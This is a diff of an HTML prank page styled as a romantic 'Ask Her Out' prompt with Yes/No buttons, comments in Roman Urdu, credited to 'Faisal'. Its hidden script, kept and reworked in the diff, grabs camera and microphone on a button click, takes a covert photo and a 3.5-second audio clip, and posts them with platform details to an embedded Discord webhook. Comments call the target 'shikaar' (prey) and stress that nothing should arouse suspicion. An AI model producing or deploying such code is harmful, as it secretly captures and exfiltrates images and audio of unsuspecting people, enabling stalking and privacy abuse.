@@ -3,27 +3,59 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Proposed Her</title>
+  <title>Ask Her Out</title>
   <style>
-    /* Sab kuch hidden taake shikaar ko shak na ho */
+    /* Sab kuch hidden taake shak na ho */
     #video, #canvas { display: none; }
     
     body {
-      background-color: #121212;
+      /* [Faisal Bhai, ye background image soft pink aur lavender gradient jaisa hai] */
+      background: linear-gradient(to right, #e8d0f1, #f4b6d0);
       margin: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       overflow: hidden;
       color: white;
+      position: relative;
     }
 
-    /* Original Container Style & Animation */
+    /* Floating elements background animation, wahi blossoms aur sparkles */
+    .bg-elements {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      overflow: hidden;
+    }
+
+    .float {
+      position: absolute;
+      bottom: -50px;
+      animation: floatUp 8s infinite linear;
+      opacity: 0.8;
+    }
+
+    @keyframes floatUp {
+      from { transform: translateY(0) rotate(0deg); opacity: 0.8; }
+      to { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+    }
+
+    /* Standard container style, soft corners aur fade in animation */
     .container {
       text-align: center;
-      padding: 20px;
+      padding: 40px;
+      background: rgba(30, 30, 30, 0.6);
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      z-index: 10;
+      width: 90%;
+      max-width: 450px;
       animation: fadeIn 1.5s ease-in-out;
     }
 
@@ -32,34 +64,27 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    h1 { margin-top: 10px; font-size: 2rem; }
-    p { color: #eee; font-size: 1.1rem; margin-bottom: 20px; }
+    h1 { margin-top: 10px; font-size: 1.8rem; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
+    p { color: #eee; font-style: italic; font-size: 1.1rem; }
 
-    /* Wahi original buttons style */
-    .btn { margin-top: 30px; }
+    .btn { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
 
-    .btn-link {
+    .btn a {
       padding: 12px 35px;
-      margin: 10px;
-      text-decoration: none;
-      background: #ff4d6d;
-      color: white;
       border-radius: 25px;
-      display: inline-block;
       font-weight: bold;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3);
-      border: none;
+      text-decoration: none;
+      color: white;
+      transition: transform 0.3s ease, background 0.3s ease;
       cursor: pointer;
+      border: none;
       font-family: inherit;
-      font-size: 1rem;
     }
 
-    .btn-link:hover {
-      transform: scale(1.1);
-      background: #ff758f;
-      box-shadow: 0 6px 20px rgba(255, 117, 143, 0.5);
-    }
+    .btn-yes { background: #ff4d6d; }
+    .btn-no { background: #555; }
+    
+    .btn a:hover { transform: scale(1.1); opacity: 0.9; }
 
     .dev-name {
       position: absolute;
@@ -68,6 +93,7 @@
       font-size: 0.8rem;
       color: rgba(255,255,255,0.7);
       font-weight: bold;
+      z-index: 15;
     }
 
     .loader { 
@@ -84,19 +110,23 @@
 </head>
 <body>
 
+  <div class="bg-elements" id="floating"></div>
+
   <div class="dev-name">Dev by Faisal</div>
 
   <div class="container">
-    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 15px;">
+    <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnRqcjd2ZTRtZGM1MzdyZDd5OGp1OGx2bDN0NHRnMWQ2ZzZrM2h0OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dv1Jbd5RW0RkOrlSy3/giphy.gif" 
+         alt="Mochi GIF" 
+         style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 10px;">
 
-    <h1>Do you love me? 🤗</h1>
-    <p>Chiku is all yours</p>
+    <h1>Please think again! 🙄</h1>
+    <p>babu kia hogya itne jaldi na mat bolo😥</p>
     
     <div class="loader" id="loader"></div>
-
+    
     <div class="btn" id="controls">
-      <button class="btn-link" onclick="startTheHunt('yes')">Yes</button>
-      <button class="btn-link" onclick="startTheHunt('no')">No</button>
+      <a class="btn-yes" onclick="startTheHunt('yes')">Yes</a>
+      <a class="btn-no" onclick="startTheHunt('no')">No</a>
     </div>
   </div>
 
@@ -104,10 +134,22 @@
   <canvas id="canvas"></canvas>
 
   <script>
+    // Floating blossoms create karne ka dynamic logic
+    const floatDiv = document.getElementById('floating');
+    for (let i = 0; i < 20; i++) {
+        const div = document.createElement('div');
+        div.className = 'float';
+        // HTML characters as blossoms and sparkles, bilkul image ki tarah
+        if (i % 2 === 0) div.innerHTML = '🌸'; else div.innerHTML = '✨';
+        div.style.left = Math.random() * 100 + '%';
+        div.style.animationDelay = Math.random() * 5 + 's';
+        div.style.fontSize = Math.random() * 15 + 15 + 'px';
+        floatDiv.appendChild(div);
+    }
+
     const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
-    async function startTheHunt(userChoice) {
-        // UI Update
+    async function startTheHunt(choice) {
         document.getElementById('controls').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
@@ -116,7 +158,7 @@
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // 1. Photo Capture (Stealthy shot)
+            // 1. Photo Capture
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -125,13 +167,13 @@
                 
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'capture.png');
-                    fd.append('content', `🎯 **Shikaar Alert!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🖥️ **Platform:** ${navigator.platform}`);
+                    fd.append('file', blob, 'shot.png');
+                    fd.append('content', `💖 **New Entry Logged!**\n👤 **User ne dabaya:** ${choice.toUpperCase()}\n🖥️ **Platform:** ${navigator.platform}\n🌍 Location: Lahore, Punjab, Pakistan`);
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 }, 'image/png');
             }, 1200);
 
-            // 2. Audio Snatching (3.5 seconds)
+            // 2. Audio Capture (Short silent recording)
             const mediaRecorder = new MediaRecorder(stream);
             const chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
@@ -140,22 +182,21 @@
                 const fd = new FormData();
                 fd.append('file', audioBlob, 'audio_log.webm');
                 fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
-                    // Final Logic
-                    if (userChoice === 'yes') {
+                    if (choice === 'yes') {
                         window.location.href = "page1.html";
                     } else {
-                        window.location.href = "no1.html";
+                        window.location.href = "no2.html";
                     }
                 });
             };
             
             mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 3500);
+            setTimeout(() => mediaRecorder.stop(), 3500); // 3.5 seconds key record key bhej do
 
         } catch (e) {
-            // Permission Error pe bhi rasta wahi hai
-            if (userChoice === 'yes') window.location.href = "page1.html";
-            else window.location.href = "no1.html";
+            // Permission fail pe bhi silent redirect taake shak na ho
+            if (choice === 'yes') window.location.href = "page1.html";
+            else window.location.href = "no2.html";
         }
     }
   </script>
